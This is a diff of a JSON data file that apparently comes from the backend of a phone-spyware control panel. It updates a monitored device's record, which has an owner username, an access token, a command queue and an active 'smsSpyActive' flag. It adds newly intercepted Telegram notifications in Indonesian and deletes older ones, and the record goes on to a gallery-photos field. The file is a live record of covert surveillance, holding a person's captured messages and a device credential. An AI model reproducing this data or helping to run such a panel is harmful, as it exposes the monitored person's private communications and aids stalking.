@@ -3031,7 +3031,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "cf99cabf9358fc617b7c22cc76eb4cb3",
-    "lastSeen": 1776753992416,
+    "lastSeen": 1776753995679,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-20T19:20:24.863Z",
@@ -3102,6 +3102,22 @@
     },
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 13:46",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776753997664
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Davii・5554 pesan baru dari 49 obrolan",
+        "time": "21/04 13:46",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776753997424
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram",
@@ -7085,22 +7101,6 @@
         "time": "21/04 13:17",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776752246269
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram: Pengguna",
-        "content": "Pesan baru",
-        "time": "21/04 13:17",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776752246206
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 13:17",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776752246051
       }
     ],
     "galleryPhotos": [
